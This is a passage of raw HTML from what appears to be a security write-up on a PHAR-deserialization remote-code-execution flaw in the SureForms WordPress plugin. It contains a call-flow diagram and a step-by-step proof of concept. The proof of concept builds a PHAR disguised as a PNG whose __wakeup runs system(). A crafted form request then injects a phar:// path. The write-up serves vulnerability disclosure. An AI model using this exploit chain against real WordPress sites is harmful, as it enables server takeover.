4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;After debugging, we can see the execution flow to the sink:&lt;/p&gt;&#xA;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;Client&amp;ensp;submit&amp;ensp;form&#34;]&amp;ensp;&#xD;&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;--&gt;&amp;ensp;B[&#34;Admin&amp;ensp;delete&amp;ensp;entry&#34;]&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;WordPress&amp;ensp;hook:&amp;ensp;admin_init&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;handle_entry_actions&#34;]&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;Entries_List_Table::handle_entry_status()&#34;]&#xD;&#xA;E&amp;ensp;--&amp;ensp;$action=delete&amp;ensp;--&gt;&amp;ensp;F[&#34;Entries_List_Table::delete_entry_files()&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G{&#34;$value&amp;ensp;is&amp;ensp;array&#34;}&#xD;&#xA;G&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;H[&#34;call&amp;ensp;file_exists(&amp;ensp;$file_path&amp;ensp;)&#34;]&amp;ensp;--&gt;&amp;ensp;L[&#34;RCE:&amp;ensp;PHAR&amp;ensp;Deserialization&#34;]&#xD;&#xA;G&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;K[&#34;continue&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Use an admin account to create a form and insert it into a post&lt;/li&gt;&#xA;&lt;li&gt;Create a PHP file &lt;code&gt;create_phar.php&lt;/code&gt; with the following code:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Define&amp;ensp;class&amp;ensp;Evil&amp;ensp;with&amp;ensp;a&amp;ensp;property&amp;ensp;and&amp;ensp;__wakeup&amp;ensp;function&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Evil&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Property&amp;ensp;command&amp;ensp;contains&amp;ensp;the&amp;ensp;system&amp;ensp;command&amp;ensp;to&amp;ensp;be&amp;ensp;executed&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ls&amp;ensp;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;__wakeup()&amp;ensp;is&amp;ensp;triggered&amp;ensp;when&amp;ensp;this&amp;ensp;object&amp;ensp;is&amp;ensp;unserialized&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;void&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;When&amp;ensp;unserialized,&amp;ensp;execute&amp;ensp;the&amp;ensp;command&amp;ensp;in&amp;ensp;$command&amp;ensp;and&amp;ensp;terminate&amp;ensp;program&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Create&amp;ensp;a&amp;ensp;new&amp;ensp;PHAR&amp;ensp;file&amp;ensp;named&amp;ensp;poc.phar&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Phar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;poc.phar&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Begin&amp;ensp;writing&amp;ensp;PHAR&amp;ensp;contents&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;startBuffering&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Add&amp;ensp;a&amp;ensp;fake&amp;ensp;entry&amp;ensp;named&amp;ensp;test.png&amp;ensp;with&amp;ensp;content&amp;ensp;&amp;#34;text&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addFromString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test.png&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;text&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Set&amp;ensp;PHAR&amp;ensp;stub&amp;ensp;beginning&amp;ensp;with&amp;ensp;PNG&amp;ensp;magic&amp;ensp;bytes&amp;ensp;to&amp;ensp;disguise&amp;ensp;it&amp;ensp;as&amp;ensp;an&amp;ensp;image,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;then&amp;ensp;__HALT_COMPILER()&amp;ensp;to&amp;ensp;end&amp;ensp;execution&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setStub&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x89&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;PNG&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r\n\x1a\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;?php&amp;ensp;__HALT_COMPILER();&amp;ensp;?&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Write&amp;ensp;metadata&amp;ensp;containing&amp;ensp;an&amp;ensp;Evil&amp;ensp;object&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setMetadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Evil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Finish&amp;ensp;writing&amp;ensp;and&amp;ensp;flush&amp;ensp;to&amp;ensp;file&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;stopBuffering&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Create the PHAR file &lt;code&gt;poc.phar&lt;/code&gt; by running:&lt;br&gt;&#xA;&lt;code&gt;php&amp;ensp;--define&amp;ensp;phar.readonly=0&amp;ensp;create_phar.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;phar.readonly&lt;/code&gt; is a directive in PHP (Phar extension configuration). By default its value is 1 (readonly) and PHAR files cannot be created. To generate PHAR files, disable readonly using &lt;code&gt;phar.readonly=0&lt;/code&gt; or configure it in &lt;code&gt;php.ini&lt;/code&gt;.&lt;/p&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Rename &lt;code&gt;poc.phar&lt;/code&gt; to &lt;code&gt;poc.png&lt;/code&gt; since file uploads typically only accept images rather than &lt;code&gt;.phar&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Upload &lt;code&gt;poc.jpg&lt;/code&gt; using the Media Editor. Take note of its upload path in &lt;code&gt;wp-content/uploads&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Resend the form submission request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-json/sureforms/v1/submit-form?_locale=user&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;Mozilla/5.0&amp;ensp;(Windows&amp;ensp;NT&amp;ensp;10.0;&amp;ensp;Win64;&amp;ensp;x64;&amp;ensp;rv:145.0)&amp;ensp;Gecko/20100101&amp;ensp;Firefox/145.0&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;application/json,&amp;ensp;*/*;q=0.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;en-US,en;q=0.7,vi;q=0.3&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;gzip,&amp;ensp;deflate,&amp;ensp;br&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Referer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;http://localhost/2025/11/19/form-testing/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;X-WP-Nonce&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;2c506366a5&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;multipart/form-data;&amp;ensp;boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;775&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Origin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;http://localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;keep-alive&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;wp-settings-time-3=1763365761&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Sec-Fetch-Dest&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;empty&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Sec-Fetch-Mode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;cors&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Sec-Fetch-Site&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;same-origin&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;X-PwnFox-Color&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;blue&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Priority&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;u=0&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;sureforms_form_submit&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;d3b9273370&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;_wp_http_referer&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/2025/11/19/form-testing/&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;form-id&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;123&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;srfm-sender-email-field&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;phar://../../../wp-content/uploads/2025/11/poc.png&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span 